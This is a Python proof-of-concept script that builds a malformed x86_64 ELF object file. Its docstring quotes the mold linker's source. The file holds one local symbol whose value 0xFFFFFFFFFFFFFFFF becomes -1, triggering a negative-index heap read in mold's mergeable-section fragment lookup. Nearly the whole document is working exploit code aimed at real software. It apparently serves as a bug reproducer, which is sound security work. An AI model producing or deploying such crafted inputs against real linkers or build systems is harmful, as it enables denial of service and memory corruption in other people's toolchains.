#!/usr/bin/env python3
"""Writes a minimal x86_64 ET_REL ELF object with one mergeable string section
(.rodata.str1.1, SHF_ALLOC|SHF_MERGE|SHF_STRINGS) containing a single real
fragment ("hello\\0"), and a .symtab defining one STT_OBJECT symbol pointing
into that section whose st_value is 0xFFFFFFFFFFFFFFFF (i.e. -1 once
reinterpreted as the signed i64 mold's code actually uses).

src/input-files.cc, ObjectFile<E>::reattach_section_pieces():
    i64 shndx = get_shndx(esym);
    MergeableSection<E> *m = sections.get_mergeable(shndx);
    if (!m || !m->parent.resolved)
      continue;
    std::tie(frag, frag_offset) = m->get_fragment(esym.st_value);   // esym.st_value is u64
    if (!frag)
      Fatal(ctx) << *this << ": bad symbol value: " << esym.st_value;

src/mold.h, MergeableSection<E>::get_fragment(i64 offset):
    auto it = ranges::upper_bound(frag_offsets, offset);
    i64 idx = it - 1 - frag_offsets.begin();     // idx == -1 when offset < frag_offsets[0]
    return {fragments[idx], offset - frag_offsets[idx]};   // fragments[-1], frag_offsets[-1]: OOB reads

Since our section has exactly one fragment at frag_offsets[0] == 0, any
offset < 0 (here -1, from the huge unsigned st_value) makes upper_bound
return begin(), so idx becomes -1 and both fragments[-1] and
frag_offsets[-1] are negative-index (heap-buffer-underflow) reads on
std::vector. The resulting garbage, non-null "frag" pointer is not caught by
the `if (!frag) Fatal(...)` check and is stored directly onto the symbol via
sym.set_frag(frag).

This object has exactly 5 sections and no relocations at all - the bug fires
straight from a malformed symtab entry, no .rela section needed.
"""
import struct
import sys

SHT_PROGBITS = 1
SHT_SYMTAB = 2
SHT_STRTAB = 3

SHF_ALLOC = 0x2
SHF_MERGE = 0x10
SHF_STRINGS = 0x20

STT_OBJECT = 1
STB_LOCAL = 0

BAD_ST_VALUE = 0xFFFFFFFFFFFFFFFF  # -1 once reinterpreted as i64


def shdr(name, type_, flags, addr, offset, size, link, info, addralign, entsize):
    return struct.pack("<IIQQQQIIQQ", name, type_, flags, addr, offset, size, link, info,
                        addralign, entsize)


def sym(name, info, other, shndx, value, size):
    return struct.pack("<IBBHQQ", name, info, other, shndx, value, size)


def build() -> bytes:
    names = b"\x00"

    def addname(s):
        nonlocal names
        off = len(names)
        names += s.encode() + b"\x00"
        return off

    n_rodata = addname(".rodata.str1.1")
    n_symtab = addname(".symtab")
    n_strtab = addname(".strtab")
    n_shstrtab = addname(".shstrtab")

    EHDR_SIZE = 64
    SHDR_SIZE = 64

    rodata_data = b"hello\x00"  # one real, null-terminated string fragment at offset 0

    strtab_data = b"\x00"
    n_evil_sym = len(strtab_data)
    strtab_data += b"evil_sym\x00"

    sym_null = sym(0, 0, 0, 0, 0, 0)
    # STT_OBJECT symbol defined at a huge (effectively negative once cast to i64)
    # value inside section index 1 (.rodata.str1.1).
    sym_evil = sym(n_evil_sym, (STB_LOCAL << 4) | STT_OBJECT, 0, 1, BAD_ST_VALUE, 0)
    symtab_data = sym_null + sym_evil

    # Section indices (fixed layout, 5 sections total):
    #   0 NULL, 1 .rodata.str1.1, 2 .symtab, 3 .strtab, 4 .shstrtab
    IDX_RODATA = 1
    IDX_SYMTAB = 2
    IDX_STRTAB = 3
    IDX_SHSTRTAB = 4

    off = EHDR_SIZE
    off_rodata = off
    off += len(rodata_data)
    off_symtab = off
    off += len(symtab_data)
    off_strtab = off
    off += len(strtab_data)
    off_shstrtab = off
    off += len(names)
    pad = (-off) % 8
    off += pad
    off_shdrs = off

    sh_null = shdr(0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    sh_rodata = shdr(n_rodata, SHT_PROGBITS, SHF_ALLOC | SHF_MERGE | SHF_STRINGS,
                      0, off_rodata, len(rodata_data), 0, 0, 1, 1)
    sh_symtab = shdr(n_symtab, SHT_SYMTAB, 0, 0, off_symtab, len(symtab_data),
                      IDX_STRTAB, 2, 8, 24)  # sh_info=2 -> first_global=2 (no globals)
    sh_strtab = shdr(n_strtab, SHT_STRTAB, 0, 0, off_strtab, len(strtab_data), 0, 0, 1, 0)
    sh_shstrtab = shdr(n_shstrtab, SHT_STRTAB, 0, 0, off_shstrtab, len(names), 0, 0, 1, 0)

    e_ident = bytes([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]) + b"\x00" * 8
    ehdr = e_ident + struct.pack(
        "<HHIQQQIHHHHHH",
        1,          # e_type = ET_REL
        62,         # e_machine = EM_X86_64
        1,          # e_version
        0,          # e_entry
        0,          # e_phoff
        off_shdrs,  # e_shoff
        0,          # e_flags
        EHDR_SIZE,
        0, 0,       # e_phentsize, e_phnum
        SHDR_SIZE,
        5,             # e_shnum
        IDX_SHSTRTAB,  # e_shstrndx
    )
    assert len(ehdr) == EHDR_SIZE

    return (ehdr + rodata_data + symtab_data + strtab_data + names + b"\x00" * pad +
            sh_null + sh_rodata + sh_symtab + sh_strtab + sh_shstrtab)


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "evil.o"
    with open(out_path, "wb") as f:
        f.write(build())
    print(f"wrote {out_path}")


if __name__ == "__main__":
    main()
